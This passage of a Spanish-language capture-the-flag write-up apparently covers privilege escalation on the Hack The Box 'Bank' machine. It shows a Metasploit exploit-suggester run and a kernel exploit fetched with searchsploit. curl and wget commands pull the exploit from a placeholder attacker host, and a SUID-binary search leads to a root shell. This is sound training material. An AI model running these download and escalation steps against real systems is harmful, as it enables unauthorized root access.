Vamos por pasos:

* Busca el **módulo Suggester** y cargalo:

```bash
msf6 exploit(multi/handler) > search suggester
.
Matching Modules
================
   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
.
.
Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
```
* Configura el modulo y activalo:
```bash
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit
.
[*] 10.10.10.29 - Collecting local exploits for php/linux...
[-] 10.10.10.29 - No suggestions available.
[*] Post module execution completed
```
Vaya, pues no funciono. Bueno, nunca esta de más probar cualquier cosilla que se te ocurra que pueda ayudar, sigamos con el Exploit planeado.

### Probando Exploit: Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation {#PruebaExp}

Vamos a descargarlo y a analizarlo:
```bash
searchsploit -m linux/local/47169.c
.
  Exploit: Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)
      URL: https://www.exploit-db.com/exploits/47169
     Path: /usr/share/exploitdb/exploits/linux/local/47169.c
    Codes: CVE-2017-1000112
 Verified: False
File Type: C source, ASCII text
```

Excelente, nos da especificaciones sobre cómo usarlo:
```bash
// Usage:
// user@ubuntu:~$ uname -a
// Linux ubuntu 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
// user@ubuntu:~$ whoami
// user
// user@ubuntu:~$ id
// uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
// user@ubuntu:~$ gcc pwn.c -o pwn
// user@ubuntu:~$ ./pwn
```

Ahora intentemos subirlo, vamos por pasos:
* Primero vamos a abrir un servidor con **Python**:
```bash
python3 -m http.server                                                            
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

* Ahora intentemos subirlo:
```bash
www-data@bank:/$ curl -O http://Tu_IP:8000/LocalPE.c
curl -O http://Tu_IP:8000/LocalPE.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0Warning: Failed to create the file LocalPE.c: Permission denied
  9 28360    9  2656    0     0   9388      0  0:00:03 --:--:--  0:00:03  9418
curl: (23) Failed writing body (0 != 2656)
```

* No se puede, intentémoslo de otra forma:
```bash
www-data@bank:/$ wget Tu_IP/LocalPE.c
wget Tu_IP/LocalPE.c
--2023-04-04 02:11:28--  http://Tu_IP/LocalPE.c
Connecting to Tu_IP:80... failed: Connection refused.
```
Era obvio que no teníamos permisos para descargar cualquier cosa, solamente lo hice para tener un ejemplo de cómo enviar archivos a un SO Linux.

### Escalando Privilegios Usando Binario de Máquina {#Binario}

¿Entonces que queda? Investiguemos que archivos tenemos permisos para usar:
```bash
www-data@bank:/$ find \-perm -4000 2>/dev/null
find \-perm -4000 2>/dev/null
./var/htb/bin/emergency
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/bin/at
./usr/bin/chsh
./usr/bin/passwd
./usr/bin/chfn
./usr/bin/pkexec
./usr/bin/newgrp
./usr/bin/traceroute6.iputils
./usr/bin/gpasswd
./usr/bin/sudo
./usr/bin/mtr
./usr/sbin/uuidd
./usr/sbin/pppd
./bin/ping
./bin/ping6
./bin/su
./bin/fusermount
./bin/mount
./bin/umount
```

Tenemos varios como el **passwd, ping** y uno que es extraño:
```bash
www-data@bank:/$ file ./var/htb/bin/emergency
file ./var/htb/bin/emergency
./var/htb/bin/emergency: setuid ELF 32-bit LSB  shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=1fff1896e5f8db5be4db7b7ebab6ee176129b399, stripped
```

Ok, veamos que permisos tiene: 
```bash
www-data@bank:/$ ls -la ./var/htb/bin/emergency
ls -la ./var/htb/bin/emergency
-rwsr-xr-x 1 root root 112204 Jun 14  2017 ./var/htb/bin/emergency
```

Mmmm ¿**Root**? Ósea que, si lo ejecutamos, ¿seremos **Root**? Hagámoslo:
```bash
www-data@bank:/$ ./var/htb/bin/emergency
./var/htb/bin/emergency
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
root.txt
```
a...Bueno, ya quedaron todas las flags.
